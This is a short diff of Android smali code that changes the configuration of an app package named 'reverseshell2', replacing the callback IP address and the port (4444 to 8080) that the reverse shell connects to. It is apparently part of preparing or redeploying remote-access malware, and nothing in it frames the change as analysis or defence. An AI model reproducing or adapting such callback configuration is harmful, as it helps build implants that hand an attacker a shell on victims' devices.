@@ -16,12 +16,12 @@
     .locals 1
 
     .line 4
-    const-string v0, "159.65.147.39"
+    const-string v0, "20.205.111.89"
 
     sput-object v0, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
 
     .line 5
-    const-string v0, "4444"
+    const-string v0, "8080"
 
     sput-object v0, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
 
